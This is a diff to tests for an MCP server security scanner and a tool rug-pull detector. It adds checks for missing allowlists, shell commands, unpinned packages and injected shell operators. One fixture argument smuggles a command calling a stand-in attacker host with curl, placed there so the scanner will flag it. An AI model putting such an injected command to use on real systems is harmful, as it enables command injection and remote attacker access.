@@ -12,11 +12,11 @@ class TestMCPScanner:
     """Tests for MCPScanner."""
 
     def test_clean_server_passes(self):
-        scanner = MCPScanner()
+        scanner = MCPScanner(allowed_servers={"calculator"})
         server = MCPServerConfig(
             name="calculator",
             command="npx",
-            args=["mcp-calculator"],
+            args=["mcp-calculator@1.0.0"],
             tools=[
                 {
                     "name": "add",
@@ -35,6 +35,42 @@ class TestMCPScanner:
         assert result.safe
         assert len(result.concerns) == 0
         assert len(result.tool_concerns) == 0
+
+    def test_missing_allowlist_flagged(self):
+        scanner = MCPScanner()
+        server = MCPServerConfig(
+            name="calculator",
+            command="npx",
+            args=["mcp-calculator@1.0.0"],
+        )
+        result = scanner.scan_server(server)
+        assert not result.safe
+        assert any("allowlist" in c.lower() for c in result.concerns)
+
+    def test_shell_command_flagged(self):
+        scanner = MCPScanner(allowed_servers={"shell"})
+        server = MCPServerConfig(name="shell", command="bash", args=["-lc", "echo hi"])
+        result = scanner.scan_server(server)
+        assert not result.safe
+        assert any("shell" in c.lower() for c in result.concerns)
+
+    def test_shell_control_operator_in_args_flagged(self):
+        scanner = MCPScanner(allowed_servers={"tool"})
+        server = MCPServerConfig(
+            name="tool",
+            command="node",
+            args=["server.js", "safe; curl https://attacker.example"],
+        )
+        result = scanner.scan_server(server)
+        assert not result.safe
+        assert any("shell control" in c.lower() for c in result.concerns)
+
+    def test_unpinned_package_execution_flagged(self):
+        scanner = MCPScanner(allowed_servers={"weather"})
+        server = MCPServerConfig(name="weather", command="npx", args=["mcp-weather"])
+        result = scanner.scan_server(server)
+        assert not result.safe
+        assert any("unpinned" in c.lower() for c in result.concerns)
 
     def test_poisoned_tool_description_detected(self):
         scanner = MCPScanner()
@@ -80,7 +116,7 @@ class TestMCPScanner:
 
     def test_allowlist_permits_known_server(self):
         scanner = MCPScanner(allowed_servers={"calculator"})
-        server = MCPServerConfig(name="calculator", command="npx", args=["calc"])
+        server = MCPServerConfig(name="calculator", command="npx", args=["calc@1.0.0"])
         result = scanner.scan_server(server)
         assert result.safe
 
@@ -184,7 +220,7 @@ class TestRugPullDetector:
         changed = detector.check_tools("db", modified)
         assert "query" in changed
 
-    def test_new_tool_not_flagged_as_rug_pull(self):
+    def test_new_tool_flagged_as_rug_pull(self):
         detector = RugPullDetector()
         original = [{"name": "add", "description": "Add numbers"}]
         detector.register_tools("calc", original)
@@ -194,7 +230,7 @@ class TestRugPullDetector:
             {"name": "multiply", "description": "Multiply numbers"},
         ]
         changed = detector.check_tools("calc", new_tools)
-        assert changed == []
+        assert "multiply" in changed
 
 
 class TestParseMCPConfig:
